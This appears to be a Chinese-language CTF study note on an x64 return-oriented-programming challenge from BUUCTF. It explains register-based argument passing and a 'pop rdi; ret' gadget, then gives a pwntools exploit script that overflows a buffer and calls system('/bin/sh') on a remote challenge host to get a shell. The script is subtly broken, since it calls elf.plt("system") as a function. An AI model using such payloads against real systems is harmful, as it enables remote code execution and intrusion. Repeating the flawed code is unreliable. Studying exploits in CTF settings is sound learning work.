为上一个的x64版本

区别在于64位函数传参先使用寄存器（以此为rdi，rsi，rdx，rcx，r8，r9）当参数超过六个时再使用栈

需要设置rdi指向binsh

使用pop rdi;ret代码片段设置rdi

使用ROPgadget寻找pop rdi;ret  [[ROPgadget命令]]

![[Pasted image 20231220101415.png]]

最终写出exp:

```python
from pwn import *
p = remote("node4.buuoj.cn",28935)
elf = ELF('buu')

p.recvuntil("Input:")
sh = 0x600A90
system = elf.plt("system")
rop = 0x4006b3

payload = b'a'*(0x80+8)+p64(rop)+p64(sh)+p64(system)
p.sendline(payload)
p.interactive()
```
